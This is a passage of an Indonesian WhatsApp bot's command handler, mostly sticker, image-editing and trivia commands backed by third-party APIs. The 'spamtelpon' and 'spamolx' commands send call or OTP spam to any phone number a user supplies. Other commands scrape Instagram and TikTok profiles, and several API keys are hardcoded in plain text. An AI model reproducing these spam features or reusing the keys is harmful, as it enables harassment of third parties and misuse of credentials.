	case 'ttp6':
	case 'ttp7':

		if (args.length == 0) return reply(`Usage: ${prefix + command} query\nExample: ${prefix + command} Gua Ganteng`)
		teks = args.join(" ")
		buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=${LolKey}&text=${encodeURI(q)}`)
		Revoer.sendMessage(from, buffer, sticker, { quoted: fgi })
		break

	case 'randomsticker':
	case 'randomstiker':
		buffer = await getBuffer(`https://kuhong-api.herokuapp.com/api/randomsticker?apikey=${hong}`)
		Revoer.sendMessage(from, buffer, sticker, { quoted: fgi })
		setTimeout(() => {
			suruh = `Klik Next Untuk Mengambil Random Sticker Berikutnya`
			sendButMessage(from, suruh, `Klik Aja Biar Ga Cape`, [
				{
					buttonId: `${prefix + command}`,
					buttonText: {
						displayText: `ɴᴇxᴛ`,
					},
					type: 1,
				},]);
		},3000)
		break

	
	case 'stickergura':
	case 'stikergura':
		buffer = await getBuffer(`https://api.lolhuman.xyz/api/sticker/gawrgura?apikey=${LolKey}`)
		Revoer.sendMessage(from, buffer, sticker, { quoted: fgi })
		setTimeout(() => {
			suruh = `Klik Next Untuk Mengambil Random Sticker Gura Berikutnya`
			sendButMessage(from, suruh, `Klik Aja Biar Ga Cape`, [
				{
					buttonId: `${prefix + command}`,
					buttonText: {
						displayText: `ɴᴇxᴛ`,
					},
					type: 1,
				},]);
		}, 3000)
		break
	case 'stickeramongus':
	case 'stikeramongus':
		buffer = await getBuffer(`https://api.lolhuman.xyz/api/sticker/amongus?apikey=${LolKey}`)
		Revoer.sendMessage(from, buffer, sticker, { quoted: fgi })
		setTimeout(() => {
			suruh = `Klik Next Untuk Mengambil Random Sticker AmoGUS Berikutnya`
			sendButMessage(from, suruh, `Klik Aja Biar Ga Cape`, [
				{
					buttonId: `${prefix + command}`,
					buttonText: {
						displayText: `ɴᴇxᴛ`,
					},
					type: 1,
				},]);
		}, 3000)
		break
	case 'stickerpatrick':
	case 'stikerpatrick':
		buffer = await getBuffer(`https://api.lolhuman.xyz/api/sticker/patrick?apikey=${LolKey}`)
		Revoer.sendMessage(from, buffer, sticker, { quoted: fgi })
		setTimeout(() => {
			suruh = `Klik Next Untuk Mengambil Random Sticker Patrick Berikutnya`
			sendButMessage(from, suruh, `Klik Aja Biar Ga Cape`, [
				{
					buttonId: `${prefix + command}`,
					buttonText: {
						displayText: `ɴᴇxᴛ`,
					},
					type: 1,
				},]);
		}, 3000)
		break
	case 'stickerdoge':
	case 'stikerdoge':
		buffer = await getBuffer(`https://api.lolhuman.xyz/api/sticker/anjing?apikey=${LolKey}`)
		Revoer.sendMessage(from, buffer, sticker, { quoted: fgi })
		setTimeout(() => {
			suruh = `Klik Next Untuk Mengambil Random Sticker Doge Berikutnya`
			sendButMessage(from, suruh, `Klik Aja Biar Ga Cape`, [
				{
					buttonId: `${prefix + command}`,
					buttonText: {
						displayText: `ɴᴇxᴛ`,
					},
					type: 1,
				},]);
		}, 3000)
		break


	case 'telesticker':
		case'telestick':

		if (args.length == 0) return reply(`Example: ${prefix + command} https://t.me/addstickers/LINE_Menhera_chan_ENG`)
		ini_url = args[0]
		ini_url = await fetchJson(`http://api.lolhuman.xyz/api/telestick?apikey=${LolKey}&url=${ini_url}`)
		ini_sticker = ini_url.result.sticker
		for (sticker_ in ini_sticker) {
			ini_buffer = await getBuffer(ini_sticker[sticker_])
			Revoer.sendMessage(from, ini_buffer, MessageType.sticker)
		}
		break
//══════════[ FITUR OTHER ]══════════//
	case 'semoji':
	case 'smoji':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		if (args.length == 0) return freply(`Example: ${prefix + command} ðŸ˜­`)
		emoji = args[0]
		try {
			emoji = encodeURI(emoji[0])
		} catch {
			emoji = encodeURI(emoji)
		}
		ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/smoji/${emoji}?apikey=XonTolAmaT`)
		Revoer.sendMessage(from, ini_buffer, sticker, { quoted: mek })
		break

	
	case 'stalkig':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		if ( args.length < 1 ) return reply('Username Nya Mana')
		nich = await fetchJson(`https://zenzapi.xyz/api/stalker/ig?username=${q}&apikey=${zenz}`)
		hasil = nich.result.caption
		gambar = await getBuffer(hasil.profile_hd)
		Revoer.sendMessage(from, gambar, image, { caption: '*Nama:* ' + hasil.full_name + '\n*Username:* ' +  hasil.user_name + '\n*Followers:* ' + hasil.followers + '\n*Following*: ' + hasil.following + '\n*User Verified?:* ' + hasil.verified + '\n*Private*: ' + hasil.private + '\n*Bio:* ' + hasil.biography})
		break

	case 'stalktiktok':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		if (args.length < 1) return reply('Username Nya Mana')
		nich = await fetchJson(`https://api.lolhuman.xyz/api/stalktiktok/${q}?apikey=${LolKey}`)
		hasil = nich.result
		gambar = await getBuffer(hasil.user_picture)
		Revoer.sendMessage(from, gambar, image, { caption: 'Nama: ' + hasil.nickname + '\nUsername: ' + hasil.username + '\nBio: ' + hasil.bio + '\nFollowers: ' + hasil.followers + '\nFollowing: ' +hasil.followings+ '\nUser Likes: ' + hasil.likes + '\nUser Video: ' + hasil.video + '\nFollow: https://tiktok.com/@'+q})
		break

case 'ssweb':
case 'ss':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (args.length < 1) return reply('Urlnya mana om')
teks = q
anu = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${teks}`)
buff = await getBuffer(anu.screenshot)
Revoer.sendMessage(from, buff, image, {mimetype:'image/jpeg',quoted: mek, caption : teks})
		break
	case 'spamtelpon':
	case 'spamtlp':
		case 'spamtelepon' :
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		if (!isDonasi) return reply('Premium Bukan Dek? Mending Donasi Dulu Seikhlasnya :v')
		if (args.length < 1) return reply('Nomornya? Contoh : #spamtelpon 821xxxxxx')
		teks = args.join(" ")
		anu = await fetchJson(`https://viko-api.herokuapp.com/api/hack/tlpn?query=${teks}&apikey=vinko`)
		get = `${anu.result}`
		Revoer.sendMessage(from, get, MessageType.text, { quoted: mek })
		break
	case 'spamolx':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		if (!isDonasi) return reply('Premium Bukan Dek? Mending Donasi Dulu Seikhlasnya :v')
		if (args.length < 1) return reply('Nomornya? Contoh : #spamtelpon 62821xxxxxx')
		teks = args.join(" ")
		anu = await fetchJson(`https://kuhong-api.herokuapp.com/api/spammer/olx?nomor=${q}&apikey=${hong}`)
		get = `SUKSES BRO ,CEK WHATSAPP ANDA/SMS`
		Revoer.sendMessage(from, get, MessageType.text, { quoted: mek })
		break
	case 'iqtest':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		if (args.length < 1) return reply('Namanya Saha?')
		anu = await fetchJson(`https://kuhong-api.herokuapp.com/api/iqtest?apikey=${hong}`)
		get = `Hai ${q}, ${anu.result}`
		Revoer.sendMessage(from, get, MessageType.text, { quoted: mek })
		break

	case 'seberapagay':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		if (args.length < 1) return reply('Namanya Saha?')
		anu = await fetchJson(`https://kuhong-api.herokuapp.com/api/persen?type=gay&nama=${q}&apikey=${hong}`)
		get = `Hai ${pushname}, ${anu.result}`
		Revoer.sendMessage(from, get, MessageType.text, { quoted: fgi })
		break
	case 'seberapatolol':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		if (args.length < 1) return reply('Namanya Saha?')
		anu = await fetchJson(`https://kuhong-api.herokuapp.com/api/persen?type=tolol&nama=${q}&apikey=${hong}`)
		get = `Hai ${pushname}, ${anu.result}`
		Revoer.sendMessage(from, get, MessageType.text, { quoted: fgi })
		break
	case 'seberapaganteng':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		if (args.length < 1) return reply('Namanya Saha?')
		anu = await fetchJson(`https://kuhong-api.herokuapp.com/api/persen?type=ganteng&nama=${q}&apikey=${hong}`)
		get = `Hai ${pushname}, ${anu.result}`
		Revoer.sendMessage(from, get, MessageType.text, { quoted: fgi })
		break
	case 'seberapacantik':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		if (args.length < 1) return reply('Namanya Saha?')
		anu = await fetchJson(`https://kuhong-api.herokuapp.com/api/persen?type=cantik&nama=${q}&apikey=${hong}`)
		get = `Hai ${pushname}, ${anu.result}`
		Revoer.sendMessage(from, get, MessageType.text, { quoted: fgi })
		break

	case  'removebg':

		if ((isMedia && !mek.videoMessage || isQuotedImage)) {
			Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
			var encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : mek
			var media = await Revoer.downloadAndSaveMediaMessage(encmedia)
			var imgbb = require('imgbb-uploader')
			anu = await imgbb("a7b8549b971be7526e684cda76fbbab8", media)
			getUrl = `${anu.display_url}`
			buff = await getBuffer(`https://kuhong-api.herokuapp.com/api/removebg?img=${getUrl}&apikey=${hong}`)
			Revoer.sendMessage(from, buff, image, { mimetype: 'image/jpeg',quoted: mek })
		}
		break

	case 'topdf':
		if ((isMedia && !mek.videoMessage || isQuotedImage)) {
			if (!isDonasi) return reply('Fitur Premium Bosh,Donasi Dulu Seikhlasnya :) Gope Juga Gpp')
			Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
			if (args < 1) return reply('Tulis Nama File Nya!')
			var encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : mek
			var media = await Revoer.downloadAndSaveMediaMessage(encmedia)
			var imgbb = require('imgbb-uploader')
			anu = await imgbb("a7b8549b971be7526e684cda76fbbab8", media)
			getUrl = `${anu.display_url}`
			buff = await getBuffer(`https://api.lolhuman.xyz/api/convert/imgtopdf?apikey=${LolKey}&img=${getUrl}`)
			Revoer.sendMessage(from, buff, document, { mimetype: Mimetype.pdf, filename: q })
		}
			break

	case 'trash':

		if ((isMedia && !mek.videoMessage || isQuotedImage)) {
			Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
			var encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : mek
			var media = await Revoer.downloadAndSaveMediaMessage(encmedia)
			var imgbb = require('imgbb-uploader')
			anu = await imgbb("a7b8549b971be7526e684cda76fbbab8", media)
			getUrl = `${anu.display_url}`
			buff = await getBuffer(`https://kuhong-api.herokuapp.com/api/deltrash?img=${getUrl}&apikey=${hong}`)
			Revoer.sendMessage(from, buff, image, { mimetype: 'image/jpeg',quoted: mek })
		}
		break
	case 'gay':

		if ((isMedia && !mek.videoMessage || isQuotedImage)) {
			Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
			var encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : mek
			var media = await Revoer.downloadAndSaveMediaMessage(encmedia)
			var imgbb = require('imgbb-uploader')
			anu = await imgbb("a7b8549b971be7526e684cda76fbbab8", media)
			getUrl = `${anu.display_url}`
			buff = await getBuffer(`https://kuhong-api.herokuapp.com/api/rainbow?img=${getUrl}&apikey=${hong}`)
			Revoer.sendMessage(from, buff, image, { mimetype: 'image/jpeg',quoted: mek })
		}
		break
	case 'nhentaipdf':
		Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
		if (args.length == 0) return reply(`Example: ${prefix + command} 12345`)
		henid = args[0]
		get_result = await fetchJson(`http://api.lolhuman.xyz/api/nhentaipdf/${henid}?apikey=${LolKey}`)
		oi = get_result.result
		ini_buffer = await getBuffer(oi)
		Revoer.sendMessage(from, ini_buffer, document, { quoted: mek, mimetype: Mimetype.pdf, filename: `${henid}.pdf` })
		break
	case 'jail':

		if ((isMedia && !mek.videoMessage || isQuotedImage)) {
			Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
			var encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : mek
			var media = await Revoer.downloadAndSaveMediaMessage(encmedia)
			var imgbb = require('imgbb-uploader')
			anu = await imgbb("a7b8549b971be7526e684cda76fbbab8", media)
			getUrl = `${anu.display_url}`
			buff = await getBuffer(`https://kuhong-api.herokuapp.com/api/jail?img=${getUrl}&apikey=${hong}`)
			Revoer.sendMessage(from, buff, image, { mimetype: 'image/jpeg', quoted: mek })
		}
		break

	case 'pencil':

		if ((isMedia && !mek.videoMessage || isQuotedImage)) {
			Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
			var encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : mek
			var media = await Revoer.downloadAndSaveMediaMessage(encmedia)
			var imgbb = require('imgbb-uploader')
			anu = await imgbb("a7b8549b971be7526e684cda76fbbab8", media)
			getUrl = `${anu.display_url}`
			buff = await getBuffer(`https://api.lolhuman.xyz/api/editor/pencil?apikey=${LolKey}&img=${getUrl}`)
			Revoer.sendMessage(from, buff, image, { mimetype: 'image/jpeg', quoted: mek })
		}
		break

	case 'rounded':

		if ((isMedia && !mek.videoMessage || isQuotedImage)) {
			Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
			var encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : mek
			var media = await Revoer.downloadAndSaveMediaMessage(encmedia)
			var imgbb = require('imgbb-uploader')
			anu = await imgbb("a7b8549b971be7526e684cda76fbbab8", media)
			getUrl = `${anu.display_url}`
			buff = await getBuffer(`https://api.lolhuman.xyz/api/editor/roundimage?apikey=${LolKey}&img=${getUrl}`)
			Revoer.sendMessage(from, buff, image, { mimetype: 'image/jpeg', quoted: mek })
		}
		break

	case 'tocartoon':
		case 'tokartun' :
		if ((isMedia && !mek.videoMessage || isQuotedImage)) {
			Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
			var encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : mek
			var media = await Revoer.downloadAndSaveMediaMessage(encmedia)
			var imgbb = require('imgbb-uploader')
			anu = await imgbb("a7b8549b971be7526e684cda76fbbab8", media)
			getUrl = `${anu.display_url}`
			buff = await getBuffer(`https://api.lolhuman.xyz/api/editor/cartoon?apikey=${LolKey}&img=${getUrl}`)
			Revoer.sendMessage(from, buff, image, { mimetype: 'image/jpeg', quoted: mek })
		}
		break

	case 'buriq':

		if ((isMedia && !mek.videoMessage || isQuotedImage)) {
			Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
			var encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : mek
			var media = await Revoer.downloadAndSaveMediaMessage(encmedia)
			var imgbb = require('imgbb-uploader')
			anu = await imgbb("a7b8549b971be7526e684cda76fbbab8", media)
			getUrl = `${anu.display_url}`
			buff = await getBuffer(`https://api.lolhuman.xyz/api/editor/pixelate?apikey=${LolKey}&img=${getUrl}`)
			Revoer.sendMessage(from, buff, image, { mimetype: 'image/jpeg', quoted: mek })
		}
		break

	case 'bikinmeme':

		if ((isMedia && !mek.videoMessage || isQuotedImage)) {
			Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
			var encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : mek
			var media = await Revoer.downloadAndSaveMediaMessage(encmedia)
			F = body.slice(10)
			var F1 = F.split("&")[0];
			var F2 = F.split("&")[1];
			var imgbb = require('imgbb-uploader')
			anu = await imgbb("a7b8549b971be7526e684cda76fbbab8", media)
			getUrl = `${anu.display_url}`
			buff = await getBuffer(`https://kuhong-api.herokuapp.com/api/memegen?img=${getUrl}&t1=${F1}&t2=${F2}&apikey=${hong}`)
			Revoer.sendMessage(from, buff, image, { mimetype : 'image/jpeg',quoted: mek })
		}
		break

	case 'hitungwr':
		if (args.length < 1) return reply('Tutor : #hitungwr Jumblah Match/Wr Lu/Wr Yang Mau Dicapai || #hitungwr 100/68.9/90')
		hitung = body.slice(9)
		var match = hitung.split("/")[0];
		var wr = hitung.split("/")[1];
		var wra = hitung.split("/")[2];
		itungin = await fetchJson(`https://zenzapi.xyz/api/information/hitungwr?apikey=${zenz}&text=${match}&text2=${wr}&text3=${wra}`)
		hangsil = `${itungin.result.description}`
		Revoer.sendMessage(from, hangsil, text, { quoted: fgi })
		break
	case 'qrcode':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		anu = await getBuffer(`https://kuhong-api.herokuapp.com/api/qrcode?text=${q}&apikey=${hong}`)
		Revoer.sendMessage(from, anu, image, { mimetype: 'image/jpeg', quoted: mek })
		break

	case 'namajepang':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		anu = await fetchJson(`https://api.lolhuman.xyz/api/ninja?apikey=${LolKey}&nama=${q}`)
		Revoer.sendMessage(from, anu.result, text, { quoted: mek })
		break

	case 'morse':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		anu = await fetchJson(`https://api.lolhuman.xyz/api/morse/encrypt?apikey=${LolKey}&text=${q}`)
		Revoer.sendMessage(from, anu.result, text, { quoted: mek })
		break

	case 'morsetr':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		anu = await fetchJson(`https://api.lolhuman.xyz/api/morse/decrypt?apikey=${LolKey}&text=${q}`)
		Revoer.sendMessage(from, anu.result, text, { quoted: mek })
		break

	case 'wanted':

		if ((isMedia && !mek.videoMessage || isQuotedImage)) {
			Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
			var encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : mek
			var media = await Revoer.downloadAndSaveMediaMessage(encmedia)
			var imgbb = require('imgbb-uploader')
			anu = await imgbb("a7b8549b971be7526e684cda76fbbab8", media)
			getUrl = `${anu.display_url}`
			buff = await getBuffer(`https://kuhong-api.herokuapp.com/api/wanted?img=${getUrl}&apikey=${hong}`)
			Revoer.sendMessage(from, buff, image, { mimetype: 'image/jpeg', quoted: mek })
		}

	case 'kisahnabi':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		if (args.length < 1) return reply('Masukan Nama Nabi')
		get = await fetchJson(`https://api.lolhuman.xyz/api/kisahnabi/${q}?apikey=XonTolAmaT`)
		kon = get.result
		temks = `Nama :${kon.name}\nKelahiran :${kon.place}\nUsia Wafat :${kon.age}\n\n${kon.story}`
		Revoer.sendMessage(from, temks, text, { quoted: mek })
		break

	case 'jadwaltvnow':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		get = await fetchJson(`https://api.lolhuman.xyz/api/jadwaltv/now?apikey=${LolKey}`)
		cnl = get.result
		temks = `*ANTV:* ${cnl.antv}\n*GTV:* ${cnl.gtv}\n*Indosiar:* ${cnl.indosiar}\n*iNews:* ${cnl.inewstv}\n*KompasTV:* ${cnl.kompastv}\n*MetroTV:* ${cnl.metrotv}\n*MNCTV:* ${cnl.mnctv}\n*NET:* ${cnl.nettv}\n*RCTI:* ${cnl.rcti}\n*SCTV:* ${cnl.sctv}\n*Trans7:* ${cnl.trans7}\n*TransTV:* ${cnl.transtv}\n*TVRI:* ${cnl.tvri}`
		Revoer.sendMessage(from, temks, text, { quoted: mek })
		break
	case 'whois':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		if (args.length < 1) return reply('Masukan Nama Domain')
		get = await fetchJson(`https://api-helgazex.herokuapp.com/api/whois?domain=${q}&apikey=kUCiJDhU`)
		kon = get.result
		Revoer.sendMessage(from, kon, text, { quoted: mek })
		break
	case 'ocr':
		if ((isMedia && !mek.videoMessage || isQuotedImage)) {
			if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
			if (!isQuotedImage) return reply('Tag Gambarnya Bro')
			var encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : mek
			var media = await Revoer.downloadAndSaveMediaMessage(encmedia)
			var imgbb = require('imgbb-uploader')
			anu = await imgbb("a7b8549b971be7526e684cda76fbbab8", media)
			getUrl = `${anu.display_url}`
			get = await fetchJson(`https://kuhong-api.herokuapp.com/api/ocr?img=${getUrl}&apikey=${hong}`)
			kon = get.result
			Revoer.sendMessage(from, kon, text, { quoted: mek })
		}
		break
	case 'simi':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		if (args.length < 1) return reply('Mau Chat Apa? Contoh : #simi halo')
		anu = await fetchJson(`https://simsimi.info/api/?text=${q}&lc=id`)
		get = anu.success
		Revoer.sendMessage(from, get, MessageType.text, { quoted: mek })
		break

	case 'asmaulhusna':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		anu = await fetchJson(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=${LolKey}`)
		get = anu.result
		Revoer.sendMessage(from, `Nama Ke: ` + get.index + 'Arab: ' + get.ar+ 'Latin: ' + get.latin + 'Arti: '+get.id, MessageType.text, { quoted: mek })
		break

	case 'shorturl':
	case 'shortlink':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		if (args.length < 1) return reply('Linknya? Contoh : google.com')
		ling = args.join(" ")
		anu = await fetchJson(`https://viko-api.herokuapp.com/api/short/tinyurl?url=${ling}&apikey=vinko`)
		get = anu.result
		Revoer.sendMessage(from, get, MessageType.text)
		break
	case 'cerpen':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		oke = await fetchJson(`https://viko-api.herokuapp.com/api/cerpen/random?apikey=vinko`)
		pen = (oke.result)
		sendButMessage(from, pen, `Klik Untuk Ke ${command} Selanjutnya`, [
			{
				buttonId: `${prefix + command}`,
				buttonText: {
					displayText: `ɴᴇxᴛ`,
				},
				type: 1,
			},]);
		break

	case 'cerror':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		oke = await fetchJson(`https://viko-api.herokuapp.com/api/cerpen/horor?apikey=vinko`)
		pen = (oke.result)
		sendButMessage(from, pen, `Klik Untuk Ke ${command} Selanjutnya`, [
			{
				buttonId: `${prefix + command}`,
				buttonText: {
					displayText: `ɴᴇxᴛ`,
				},
				type: 1,
			},]);
		break;

	case 'cercin':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		oke = await fetchJson(`https://viko-api.herokuapp.com/api/cerpen/cinta?apikey=vinko`)
		pen = (oke.result)
		sendButMessage(from, pen, `Klik Untuk Ke ${command} Selanjutnya`, [
			{
				buttonId: `${prefix + command}`,
				buttonText: {
					displayText: `ɴᴇxᴛ`,
				},
				type: 1,
			},]);
		break;

case 'sc':
case 'script':
case 'sourcode':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
fakeitem(`Apaan? Mau SC? Beli Jink Hubungi Owner`)
break
case 'rules':
case 's&k':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
fakeitem(rules(prefix, botname))
break
case 'runtime':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
textImg(`Bot Aktif Selama ${runtime(process.uptime())}`)
break
case 'ping':
case 'speed':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
timestampe = speed();
latensie = speed() - timestampe
textImg(`「 *𝙎𝙋𝙀𝙀𝘿 𝙏𝙀𝙎𝙏* 」\nMerespon dalam ${latensie.toFixed(4)} Sec 💬`)
break
case 'd':
case 'del':
case 'delete':''
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		if(!isOwner && !mek.key.fromMe) return reply('Fitur Khusus Owner Dek')
		Revoer.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
		reply('Sukses Menghapus Pesan')
		break
case 'verify':
case 'daftar':
if (isRegistered) return textImg('_Maaf kakak sudah terdaftar_')
const serialUser = createSerial(18)
veri = sender
_registered.push(sender)
fs.writeFileSync('./database/registered.json', JSON.stringify(_registered))
addRegisteredUser(sender, serialUser)
const jancok = `「 *PENDAFTARAN USER* 」

👤 *Nama :* ${pushname}
🐣 *Nomor :* @${sender.split('@')[0]}
💌 *Serial :* ${serialUser}
🏳‍🌈 *Terdaftar Di* : ${isGroup ? 'Grup' : 'Pribadi'}
🌻 *Total Pengguna :* ${_registered.length}

*「 ${botname} 」*`
gbutsan = [
{buttonId:`${prefix}command`,buttonText:{displayText:'LOGIN'},type:1},
{buttonId:`${prefix}rules`,buttonText:{displayText:'RULES'},type:1},
{buttonId: `${prefix}grupbot`, buttonText: { displayText: 'JOIN GRUP BOT'}, type: 1 }
]
mhan = await Revoer.prepareMessage(from, ofrply, image, {thumbnail: ofrply})
const sendBtnVeryy = {
imageMessage: mhan.message.imageMessage,
contentText:`${jancok}`,
footerText:'Terimakasih Sudah Mendaftar', 
buttons: gbutsan,
headerType: 4
}
Revoer.sendMessage(from, sendBtnVeryy, MessageType.buttonsMessage, {quoted:fgi, contextInfo: { mentionedJid: [sender]}})
console.log(color('[REGISTER]'), color(time, 'yellow'), 'Serial:', color(serialUser, 'cyan'), 'in', color(sender || groupName))
	    // console.log(e)
		break

	case 'sayasudahdonasi':
		if (isDonasi) return textImg('_Kamu Sudah Donasi Kack Silahkan Akses All Prem Feature Menunya_')
		const serialdonate = createSerial(18)
		veri = sender
		_donasi.push(sender)
		fs.writeFileSync('./database/donate.json', JSON.stringify(_donasi))
		addKangDonasi(sender, serialdonate)
